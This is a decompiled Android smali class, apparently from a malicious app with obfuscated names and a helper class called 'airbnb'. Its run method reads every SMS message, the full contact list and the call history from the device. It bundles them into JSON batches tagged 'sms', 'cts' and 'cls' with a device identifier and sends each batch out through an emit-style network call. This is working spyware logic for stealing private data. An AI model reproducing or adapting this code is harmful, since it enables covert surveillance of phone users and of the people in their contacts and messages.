.class public final synthetic Ls0/f;
.super Ljava/lang/Object;
.source "r8-map-id-7d7ae25efe95319b69974e8de8fecbf659b28a04fb22faa5664366b60d5b8370"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final synthetic a:I

.field public final synthetic b:Lcgn/cdfbgd/s;


# direct methods
.method public native synthetic constructor <init>(Lcgn/cdfbgd/s;I)V
.end method


# virtual methods
.method public final run()V
    .locals 31

    .line 1
    move-object/from16 v1, p0

    .line 2
    .line 3
    iget v0, v1, Ls0/f;->a:I

    .line 4
    .line 5
    const/4 v2, -0x1

    .line 6
    const-string v5, "b"

    .line 7
    .line 8
    const-string v6, "i"

    .line 9
    .line 10
    const-string v7, "o"

    .line 11
    .line 12
    const-string v8, "type"

    .line 13
    .line 14
    const-string v9, "date"

    .line 15
    .line 16
    const-string v12, "cwq"

    .line 17
    .line 18
    const-string v13, "id"

    .line 19
    .line 20
    const-string v14, "a"

    .line 21
    .line 22
    const-string v15, "t"

    .line 23
    .line 24
    const-wide/16 v16, 0x1f4

    .line 25
    .line 26
    const-string v3, "n"

    .line 27
    .line 28
    const-string v4, "d"

    .line 29
    .line 30
    iget-object v11, v1, Ls0/f;->b:Lcgn/cdfbgd/s;

    .line 31
    .line 32
    packed-switch v0, :pswitch_data_0

    .line 33
    .line 34
    .line 35
    sget-boolean v0, Lcgn/cdfbgd/s;->b:Z

    .line 36
    .line 37
    :try_start_0
    invoke-virtual {v11}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    .line 38
    .line 39
    .line 40
    move-result-object v19

    .line 41
    sget-object v20, Landroid/provider/Telephony$Sms;->CONTENT_URI:Landroid/net/Uri;

    .line 42
    .line 43
    const/16 v23, 0x0

    .line 44
    .line 45
    const/16 v24, 0x0

    .line 46
    .line 47
    const/16 v21, 0x0

    .line 48
    .line 49
    const/16 v22, 0x0

    .line 50
    .line 51
    invoke-virtual/range {v19 .. v24}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    .line 52
    .line 53
    .line 54
    move-result-object v2

    .line 55
    new-instance v11, Le2/a;

    .line 56
    .line 57
    invoke-direct {v11}, Le2/a;-><init>()V

    .line 58
    .line 59
    .line 60
    if-eqz v2, :cond_6

    .line 61
    .line 62
    const/16 v19, 0x1

    .line 63
    .line 64
    invoke-interface {v2}, Landroid/database/Cursor;->getCount()I

    .line 65
    .line 66
    .line 67
    move-result v10

    .line 68
    invoke-interface {v2}, Landroid/database/Cursor;->moveToLast()Z

    .line 69
    .line 70
    .line 71
    move-result v0

    .line 72
    if-eqz v0, :cond_5

    .line 73
    .line 74
    const/4 v1, 0x0

    .line 75
    const/16 v18, 0x0

    .line 76
    .line 77
    :goto_0
    if-ge v1, v10, :cond_5

    .line 78
    .line 79
    move/from16 v20, v1

    .line 80
    .line 81
    add-int/lit8 v1, v18, 0x1

    .line 82
    .line 83
    new-instance v0, Ljava/util/Date;

    .line 84
    .line 85
    move-object/from16 v21, v6

    .line 86
    .line 87
    invoke-interface {v2, v9}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    .line 88
    .line 89
    .line 90
    move-result v6

    .line 91
    invoke-interface {v2, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    .line 92
    .line 93
    .line 94
    move-result-object v6

    .line 95
    move-object/from16 v22, v7

    .line 96
    .line 97
    invoke-static {v6}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    .line 98
    .line 99
    .line 100
    move-result-wide v6

    .line 101
    invoke-direct {v0, v6, v7}, Ljava/util/Date;-><init>(J)V

    .line 102
    .line 103
    .line 104
    invoke-virtual {v0}, Ljava/util/Date;->toString()Ljava/lang/String;

    .line 105
    .line 106
    .line 107
    move-result-object v0

    .line 108
    const-string v6, ""

    .line 109
    .line 110
    invoke-interface {v2, v8}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    .line 111
    .line 112
    .line 113
    move-result v7

    .line 114
    invoke-interface {v2, v7}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    .line 115
    .line 116
    .line 117
    move-result-object v7

    .line 118
    invoke-static {v7}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    .line 119
    .line 120
    .line 121
    move-result v7

    .line 122
    move-object/from16 v18, v6

    .line 123
    .line 124
    move/from16 v6, v19

    .line 125
    .line 126
    if-eq v7, v6, :cond_2

    .line 127
    .line 128
    const/4 v6, 0x2

    .line 129
    if-eq v7, v6, :cond_1

    .line 130
    .line 131
    const/4 v6, 0x4

    .line 132
    if-eq v7, v6, :cond_0

    .line 133
    .line 134
    move-object/from16 v6, v18

    .line 135
    .line 136
    goto :goto_1

    .line 137
    :cond_0
    move-object/from16 v6, v22

    .line 138
    .line 139
    goto :goto_1

    .line 140
    :cond_1
    const-string v6, "s"

    .line 141
    .line 142
    goto :goto_1

    .line 143
    :catch_0
    move-exception v0

    .line 144
    goto :goto_3

    .line 145
    :cond_2
    move-object/from16 v6, v21

    .line 146
    .line 147
    :goto_1
    new-instance v7, Le2/c;

    .line 148
    .line 149
    invoke-direct {v7}, Le2/c;-><init>()V

    .line 150
    .line 151
    .line 152
    invoke-virtual {v7, v4, v0}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 153
    .line 154
    .line 155
    const-string v0, "address"

    .line 156
    .line 157
    invoke-interface {v2, v0}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    .line 158
    .line 159
    .line 160
    move-result v0

    .line 161
    invoke-interface {v2, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    .line 162
    .line 163
    .line 164
    move-result-object v0

    .line 165
    invoke-virtual {v7, v3, v0}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 166
    .line 167
    .line 168
    const-string v0, "body"

    .line 169
    .line 170
    invoke-interface {v2, v0}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    .line 171
    .line 172
    .line 173
    move-result v0

    .line 174
    invoke-interface {v2, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    .line 175
    .line 176
    .line 177
    move-result-object v0

    .line 178
    invoke-virtual {v7, v5, v0}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 179
    .line 180
    .line 181
    invoke-virtual {v7, v15, v6}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 182
    .line 183
    .line 184
    invoke-virtual {v11, v7}, Le2/a;->c(Ljava/lang/Object;)V

    .line 185
    .line 186
    .line 187
    rem-int/lit8 v0, v1, 0x64
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 188
    .line 189
    if-eqz v0, :cond_3

    .line 190
    .line 191
    if-ne v1, v10, :cond_4

    .line 192
    .line 193
    :cond_3
    :try_start_1
    new-instance v0, Le2/c;

    .line 194
    .line 195
    invoke-direct {v0}, Le2/c;-><init>()V

    .line 196
    .line 197
    .line 198
    const-string v6, "sms"

    .line 199
    .line 200
    invoke-virtual {v0, v14, v6}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 201
    .line 202
    .line 203
    invoke-virtual {v0, v4, v11}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 204
    .line 205
    .line 206
    sget-object v6, Lcgn/cdfbgd/airbnb;->c:Ljava/lang/String;

    .line 207
    .line 208
    invoke-virtual {v0, v13, v6}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 209
    .line 210
    .line 211
    sget-object v6, Lcgn/cdfbgd/airbnb;->d:Lv0/r;

    .line 212
    .line 213
    invoke-virtual {v0}, Le2/c;->toString()Ljava/lang/String;

    .line 214
    .line 215
    .line 216
    move-result-object v0

    .line 217
    filled-new-array {v0}, [Ljava/lang/Object;

    .line 218
    .line 219
    .line 220
    move-result-object v0

    .line 221
    invoke-virtual {v6, v12, v0}, Lv0/r;->a(Ljava/lang/String;[Ljava/lang/Object;)Lk0/b;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 222
    .line 223
    .line 224
    goto :goto_2

    .line 225
    :catch_1
    move-exception v0

    .line 226
    :try_start_2
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    .line 227
    .line 228
    .line 229
    :goto_2
    invoke-static/range {v16 .. v17}, Ljava/lang/Thread;->sleep(J)V

    .line 230
    .line 231
    .line 232
    :cond_4
    invoke-interface {v2}, Landroid/database/Cursor;->moveToPrevious()Z

    .line 233
    .line 234
    .line 235
    add-int/lit8 v0, v20, 0x1

    .line 236
    .line 237
    move/from16 v18, v1

    .line 238
    .line 239
    move-object/from16 v6, v21

    .line 240
    .line 241
    move-object/from16 v7, v22

    .line 242
    .line 243
    const/16 v19, 0x1

    .line 244
    .line 245
    move v1, v0

    .line 246
    goto/16 :goto_0

    .line 247
    .line 248
    :cond_5
    invoke-interface {v2}, Landroid/database/Cursor;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 249
    .line 250
    .line 251
    goto :goto_4

    .line 252
    :goto_3
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    .line 253
    .line 254
    .line 255
    :cond_6
    :goto_4
    return-void

    .line 256
    :pswitch_0
    sget-boolean v0, Lcgn/cdfbgd/s;->b:Z

    .line 257
    .line 258
    const-string v0, "data1"

    .line 259
    .line 260
    const-string v1, "display_name"

    .line 261
    .line 262
    const-string v5, "account_type"

    .line 263
    .line 264
    const-string v6, "contact_id"

    .line 265
    .line 266
    :try_start_3
    new-instance v7, Le2/a;

    .line 267
    .line 268
    invoke-direct {v7}, Le2/a;-><init>()V

    .line 269
    .line 270
    .line 271
    new-instance v8, Ljava/util/HashMap;

    .line 272
    .line 273
    invoke-direct {v8}, Ljava/util/HashMap;-><init>()V

    .line 274
    .line 275
    .line 276
    invoke-virtual {v11}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    .line 277
    .line 278
    .line 279
    move-result-object v16

    .line 280
    sget-object v17, Landroid/provider/ContactsContract$RawContacts;->CONTENT_URI:Landroid/net/Uri;

    .line 281
    .line 282
    filled-new-array {v6, v5}, [Ljava/lang/String;

    .line 283
    .line 284
    .line 285
    move-result-object v18

    .line 286
    const/16 v20, 0x0

    .line 287
    .line 288
    const/16 v21, 0x0

    .line 289
    .line 290
    const/16 v19, 0x0

    .line 291
    .line 292
    invoke-virtual/range {v16 .. v21}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    .line 293
    .line 294
    .line 295
    move-result-object v9

    .line 296
    if-eqz v9, :cond_a

    .line 297
    .line 298
    invoke-interface {v9, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    .line 299
    .line 300
    .line 301
    move-result v10

    .line 302
    invoke-interface {v9, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    .line 303
    .line 304
    .line 305
    move-result v5

    .line 306
    :cond_7
    :goto_5
    invoke-interface {v9}, Landroid/database/Cursor;->moveToNext()Z

    .line 307
    .line 308
    .line 309
    move-result v16

    .line 310
    if-eqz v16, :cond_9

    .line 311
    .line 312
    if-eq v10, v2, :cond_7

    .line 313
    .line 314
    if-ne v5, v2, :cond_8

    .line 315
    .line 316
    goto :goto_5

    .line 317
    :cond_8
    invoke-interface {v9, v10}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    .line 318
    .line 319
    .line 320
    move-result-object v2

    .line 321
    move/from16 v16, v10

    .line 322
    .line 323
    invoke-interface {v9, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    .line 324
    .line 325
    .line 326
    move-result-object v10

    .line 327
    invoke-virtual {v8, v2, v10}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 328
    .line 329
    .line 330
    move/from16 v10, v16

    .line 331
    .line 332
    const/4 v2, -0x1

    .line 333
    goto :goto_5

    .line 334
    :cond_9
    invoke-interface {v9}, Landroid/database/Cursor;->close()V

    .line 335
    .line 336
    .line 337
    :cond_a
    invoke-virtual {v11}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    .line 338
    .line 339
    .line 340
    move-result-object v21

    .line 341
    sget-object v22, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    .line 342
    .line 343
    filled-new-array {v6, v1, v0}, [Ljava/lang/String;

    .line 344
    .line 345
    .line 346
    move-result-object v23

    .line 347
    const/16 v25, 0x0

    .line 348
    .line 349
    const/16 v26, 0x0

    .line 350
    .line 351
    const/16 v24, 0x0

    .line 352
    .line 353
    invoke-virtual/range {v21 .. v26}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    .line 354
    .line 355
    .line 356
    move-result-object v2

    .line 357
    if-eqz v2, :cond_e

    .line 358
    .line 359
    invoke-interface {v2, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    .line 360
    .line 361
    .line 362
    move-result v5

    .line 363
    invoke-interface {v2, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    .line 364
    .line 365
    .line 366
    move-result v1

    .line 367
    invoke-interface {v2, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    .line 368
    .line 369
    .line 370
    move-result v0

    .line 371
    :cond_b
    :goto_6
    invoke-interface {v2}, Landroid/database/Cursor;->moveToNext()Z

    .line 372
    .line 373
    .line 374
    move-result v6

    .line 375
    if-eqz v6, :cond_d

    .line 376
    .line 377
    const/4 v6, -0x1

    .line 378
    if-eq v5, v6, :cond_b

    .line 379
    .line 380
    if-eq v1, v6, :cond_b

    .line 381
    .line 382
    if-ne v0, v6, :cond_c

    .line 383
    .line 384
    goto :goto_6

    .line 385
    :cond_c
    invoke-interface {v2, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    .line 386
    .line 387
    .line 388
    move-result-object v6

    .line 389
    invoke-interface {v2, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    .line 390
    .line 391
    .line 392
    move-result-object v9

    .line 393
    invoke-interface {v2, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    .line 394
    .line 395
    .line 396
    move-result-object v10

    .line 397
    const-string v11, "\u672a\u77e5"

    .line 398
    .line 399
    invoke-virtual {v8, v6, v11}, Ljava/util/HashMap;->getOrDefault(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 400
    .line 401
    .line 402
    move-result-object v6

    .line 403
    check-cast v6, Ljava/lang/String;

    .line 404
    .line 405
    new-instance v11, Le2/c;

    .line 406
    .line 407
    invoke-direct {v11}, Le2/c;-><init>()V

    .line 408
    .line 409
    .line 410
    invoke-virtual {v11, v3, v10}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 411
    .line 412
    .line 413
    const-string v10, "c"

    .line 414
    .line 415
    invoke-virtual {v11, v10, v9}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 416
    .line 417
    .line 418
    invoke-virtual {v11, v15, v6}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 419
    .line 420
    .line 421
    invoke-virtual {v7, v11}, Le2/a;->c(Ljava/lang/Object;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    .line 422
    .line 423
    .line 424
    goto :goto_6

    .line 425
    :cond_d
    :try_start_4
    new-instance v0, Le2/c;

    .line 426
    .line 427
    invoke-direct {v0}, Le2/c;-><init>()V

    .line 428
    .line 429
    .line 430
    const-string v1, "cts"

    .line 431
    .line 432
    invoke-virtual {v0, v14, v1}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 433
    .line 434
    .line 435
    invoke-virtual {v0, v4, v7}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 436
    .line 437
    .line 438
    sget-object v1, Lcgn/cdfbgd/airbnb;->c:Ljava/lang/String;

    .line 439
    .line 440
    invoke-virtual {v0, v13, v1}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 441
    .line 442
    .line 443
    sget-object v1, Lcgn/cdfbgd/airbnb;->d:Lv0/r;

    .line 444
    .line 445
    invoke-virtual {v0}, Le2/c;->toString()Ljava/lang/String;

    .line 446
    .line 447
    .line 448
    move-result-object v0

    .line 449
    filled-new-array {v0}, [Ljava/lang/Object;

    .line 450
    .line 451
    .line 452
    move-result-object v0

    .line 453
    invoke-virtual {v1, v12, v0}, Lv0/r;->a(Ljava/lang/String;[Ljava/lang/Object;)Lk0/b;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    .line 454
    .line 455
    .line 456
    goto :goto_7

    .line 457
    :catch_2
    move-exception v0

    .line 458
    :try_start_5
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    .line 459
    .line 460
    .line 461
    :goto_7
    invoke-interface {v2}, Landroid/database/Cursor;->close()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    .line 462
    .line 463
    .line 464
    :catch_3
    :cond_e
    return-void

    .line 465
    :pswitch_1
    move-object/from16 v21, v6

    .line 466
    .line 467
    move-object/from16 v22, v7

    .line 468
    .line 469
    sget-boolean v0, Lcgn/cdfbgd/s;->b:Z

    .line 470
    .line 471
    :try_start_6
    invoke-virtual {v11}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    .line 472
    .line 473
    .line 474
    move-result-object v23

    .line 475
    sget-object v24, Landroid/provider/CallLog$Calls;->CONTENT_URI:Landroid/net/Uri;

    .line 476
    .line 477
    const-string v28, "date DESC"

    .line 478
    .line 479
    const/16 v25, 0x0

    .line 480
    .line 481
    const/16 v26, 0x0

    .line 482
    .line 483
    const/16 v27, 0x0

    .line 484
    .line 485
    invoke-virtual/range {v23 .. v28}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    .line 486
    .line 487
    .line 488
    move-result-object v1

    .line 489
    new-instance v2, Le2/a;

    .line 490
    .line 491
    invoke-direct {v2}, Le2/a;-><init>()V

    .line 492
    .line 493
    .line 494
    if-eqz v1, :cond_17

    .line 495
    .line 496
    invoke-interface {v1}, Landroid/database/Cursor;->moveToLast()Z

    .line 497
    .line 498
    .line 499
    move-result v0

    .line 500
    if-eqz v0, :cond_17

    .line 501
    .line 502
    const-string v0, "number"

    .line 503
    .line 504
    invoke-interface {v1, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    .line 505
    .line 506
    .line 507
    move-result v6

    .line 508
    const-string v0, "name"

    .line 509
    .line 510
    invoke-interface {v1, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    .line 511
    .line 512
    .line 513
    move-result v7

    .line 514
    invoke-interface {v1, v9}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    .line 515
    .line 516
    .line 517
    move-result v9

    .line 518
    invoke-interface {v1, v8}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    .line 519
    .line 520
    .line 521
    move-result v8

    .line 522
    const-string v0, "duration"

    .line 523
    .line 524
    invoke-interface {v1, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    .line 525
    .line 526
    .line 527
    move-result v10

    .line 528
    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I

    .line 529
    .line 530
    .line 531
    move-result v11
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    .line 532
    move-object/from16 v23, v5

    .line 533
    .line 534
    const/16 v18, 0x0

    .line 535
    .line 536
    const/16 v19, 0x1

    .line 537
    .line 538
    :goto_8
    add-int/lit8 v5, v18, 0x1

    .line 539
    .line 540
    const-string v0, "Unknown"

    .line 541
    .line 542
    move-object/from16 v18, v12

    .line 543
    .line 544
    const/4 v12, -0x1

    .line 545
    if-eq v6, v12, :cond_f

    .line 546
    .line 547
    :try_start_7
    invoke-interface {v1, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    .line 548
    .line 549
    .line 550
    move-result-object v20

    .line 551
    move-object/from16 v29, v20

    .line 552
    .line 553
    move-object/from16 v20, v0

    .line 554
    .line 555
    move-object/from16 v0, v29

    .line 556
    .line 557
    goto :goto_9

    .line 558
    :catch_4
    move-exception v0

    .line 559
    goto/16 :goto_14

    .line 560
    .line 561
    :cond_f
    move-object/from16 v20, v0

    .line 562
    .line 563
    :goto_9
    if-eq v7, v12, :cond_10

    .line 564
    .line 565
    invoke-interface {v1, v7}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    .line 566
    .line 567
    .line 568
    move-result-object v20

    .line 569
    :cond_10
    move/from16 v24, v6

    .line 570
    .line 571
    move-object/from16 v6, v20

    .line 572
    .line 573
    if-eq v10, v12, :cond_11

    .line 574
    .line 575
    invoke-interface {v1, v10}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    .line 576
    .line 577
    .line 578
    move-result-object v20

    .line 579
    :goto_a
    move/from16 v25, v7

    .line 580
    .line 581
    move-object/from16 v7, v20

    .line 582
    .line 583
    goto :goto_b

    .line 584
    :cond_11
    const-string v20, "0"

    .line 585
    .line 586
    goto :goto_a

    .line 587
    :goto_b
    if-eq v9, v12, :cond_12

    .line 588
    .line 589
    invoke-interface {v1, v9}, Landroid/database/Cursor;->getLong(I)J

    .line 590
    .line 591
    .line 592
    move-result-wide v26

    .line 593
    :goto_c
    move/from16 v28, v10

    .line 594
    .line 595
    move-wide/from16 v29, v26

    .line 596
    .line 597
    move/from16 v26, v9

    .line 598
    .line 599
    move-wide/from16 v9, v29

    .line 600
    .line 601
    goto :goto_d

    .line 602
    :cond_12
    const-wide/16 v26, 0x0

    .line 603
    .line 604
    goto :goto_c

    .line 605
    :goto_d
    new-instance v12, Ljava/util/Date;

    .line 606
    .line 607
    invoke-direct {v12, v9, v10}, Ljava/util/Date;-><init>(J)V

    .line 608
    .line 609
    .line 610
    const/4 v9, -0x1

    .line 611
    if-eq v8, v9, :cond_13

    .line 612
    .line 613
    invoke-interface {v1, v8}, Landroid/database/Cursor;->getInt(I)I

    .line 614
    .line 615
    .line 616
    move-result v10

    .line 617
    goto :goto_e

    .line 618
    :cond_13
    move v10, v9

    .line 619
    :goto_e
    packed-switch v10, :pswitch_data_1

    .line 620
    .line 621
    .line 622
    const-string v10, "u"

    .line 623
    .line 624
    goto :goto_f

    .line 625
    :pswitch_2
    move-object/from16 v10, v23

    .line 626
    .line 627
    goto :goto_f

    .line 628
    :pswitch_3
    const-string v10, "r"

    .line 629
    .line 630
    goto :goto_f

    .line 631
    :pswitch_4
    const-string v10, "v"

    .line 632
    .line 633
    goto :goto_f

    .line 634
    :pswitch_5
    const-string v10, "m"

    .line 635
    .line 636
    goto :goto_f

    .line 637
    :pswitch_6
    move-object/from16 v10, v22

    .line 638
    .line 639
    goto :goto_f

    .line 640
    :pswitch_7
    move-object/from16 v10, v21

    .line 641
    .line 642
    :goto_f
    new-instance v9, Le2/c;

    .line 643
    .line 644
    invoke-direct {v9}, Le2/c;-><init>()V

    .line 645
    .line 646
    .line 647
    invoke-virtual {v12}, Ljava/util/Date;->toString()Ljava/lang/String;

    .line 648
    .line 649
    .line 650
    move-result-object v12

    .line 651
    invoke-virtual {v9, v4, v12}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 652
    .line 653
    .line 654
    invoke-virtual {v9, v15, v10}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 655
    .line 656
    .line 657
    const-string v10, "du"

    .line 658
    .line 659
    invoke-virtual {v9, v10, v7}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 660
    .line 661
    .line 662
    new-instance v7, Ljava/lang/StringBuilder;

    .line 663
    .line 664
    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    .line 665
    .line 666
    .line 667
    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 668
    .line 669
    .line 670
    const-string v6, " ("

    .line 671
    .line 672
    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 673
    .line 674
    .line 675
    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 676
    .line 677
    .line 678
    const-string v0, ")"

    .line 679
    .line 680
    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 681
    .line 682
    .line 683
    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 684
    .line 685
    .line 686
    move-result-object v0

    .line 687
    invoke-virtual {v9, v3, v0}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 688
    .line 689
    .line 690
    invoke-virtual {v2, v9}, Le2/a;->c(Ljava/lang/Object;)V

    .line 691
    .line 692
    .line 693
    rem-int/lit8 v0, v5, 0x64
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_4

    .line 694
    .line 695
    if-eqz v0, :cond_15

    .line 696
    .line 697
    if-ne v5, v11, :cond_14

    .line 698
    .line 699
    goto :goto_10

    .line 700
    :cond_14
    move-object/from16 v7, v18

    .line 701
    .line 702
    goto :goto_13

    .line 703
    :cond_15
    :goto_10
    :try_start_8
    new-instance v0, Le2/c;

    .line 704
    .line 705
    invoke-direct {v0}, Le2/c;-><init>()V

    .line 706
    .line 707
    .line 708
    const-string v6, "cls"

    .line 709
    .line 710
    invoke-virtual {v0, v14, v6}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 711
    .line 712
    .line 713
    invoke-virtual {v0, v4, v2}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 714
    .line 715
    .line 716
    sget-object v6, Lcgn/cdfbgd/airbnb;->c:Ljava/lang/String;

    .line 717
    .line 718
    invoke-virtual {v0, v13, v6}, Le2/c;->h(Ljava/lang/String;Ljava/lang/Object;)V

    .line 719
    .line 720
    .line 721
    sget-object v6, Lcgn/cdfbgd/airbnb;->d:Lv0/r;

    .line 722
    .line 723
    invoke-virtual {v0}, Le2/c;->toString()Ljava/lang/String;

    .line 724
    .line 725
    .line 726
    move-result-object v0

    .line 727
    filled-new-array {v0}, [Ljava/lang/Object;

    .line 728
    .line 729
    .line 730
    move-result-object v0
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_6

    .line 731
    move-object/from16 v7, v18

    .line 732
    .line 733
    :try_start_9
    invoke-virtual {v6, v7, v0}, Lv0/r;->a(Ljava/lang/String;[Ljava/lang/Object;)Lk0/b;
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_5

    .line 734
    .line 735
    .line 736
    goto :goto_12

    .line 737
    :catch_5
    move-exception v0

    .line 738
    goto :goto_11

    .line 739
    :catch_6
    move-exception v0

    .line 740
    move-object/from16 v7, v18

    .line 741
    .line 742
    :goto_11
    :try_start_a
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    .line 743
    .line 744
    .line 745
    :goto_12
    invoke-static/range {v16 .. v17}, Ljava/lang/Thread;->sleep(J)V

    .line 746
    .line 747
    .line 748
    :goto_13
    invoke-interface {v1}, Landroid/database/Cursor;->moveToPrevious()Z

    .line 749
    .line 750
    .line 751
    move-result v0

    .line 752
    if-nez v0, :cond_16

    .line 753
    .line 754
    invoke-interface {v1}, Landroid/database/Cursor;->close()V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_4

    .line 755
    .line 756
    .line 757
    goto :goto_15

    .line 758
    :cond_16
    move/from16 v18, v5

    .line 759
    .line 760
    move-object v12, v7

    .line 761
    move/from16 v6, v24

    .line 762
    .line 763
    move/from16 v7, v25

    .line 764
    .line 765
    move/from16 v9, v26

    .line 766
    .line 767
    move/from16 v10, v28

    .line 768
    .line 769
    goto/16 :goto_8

    .line 770
    .line 771
    :goto_14
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    .line 772
    .line 773
    .line 774
    :cond_17
    :goto_15
    return-void

    .line 775
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_1
        :pswitch_0
    .end packed-switch

    .line 776
    .line 777
    .line 778
    .line 779
    .line 780
    .line 781
    .line 782
    .line 783
    :pswitch_data_1
    .packed-switch 0x1
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
    .end packed-switch
.end method
